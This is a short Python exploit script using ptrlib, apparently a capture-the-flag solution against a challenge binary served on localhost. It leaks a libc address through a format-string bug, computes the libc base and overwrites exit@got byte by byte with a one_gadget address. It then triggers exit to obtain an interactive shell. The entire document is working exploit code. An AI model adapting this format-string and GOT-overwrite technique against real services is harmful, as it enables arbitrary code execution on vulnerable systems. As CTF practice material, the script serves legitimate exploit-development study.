from ptrlib import *

elf = ELF("../distfiles/chall")
libc = ELF("../distfiles/libc-2.27.so")
sock = Socket("localhost", 9003)
delta = 231
one_gadget = 0x10a38c

# leak libc base
sock.recvuntil("$ ")
sock.sendline("%25$p")
addr_libc_start_main_ret = int(sock.recvuntil(":")[:-1], 16)
libc_base = addr_libc_start_main_ret - libc.symbol("__libc_start_main") - delta
logger.info("libc base = " + hex(libc_base))

addr_one_gadget = libc_base + one_gadget

# write one gadget to exit@got
for i in range(8):
    writes = {elf.got("exit") + i: (addr_one_gadget >> (i * 8)) & 0xFF}
    payload = fsb(
        pos = 12,
        writes = writes,
        bs = 1,
        bits = 64,
        null = False
    )
    sock.recvuntil("$ ")
    sock.sendline(payload)

# get the shell!
sock.recvuntil("$")
sock.sendline("exit")

sock.interactive()
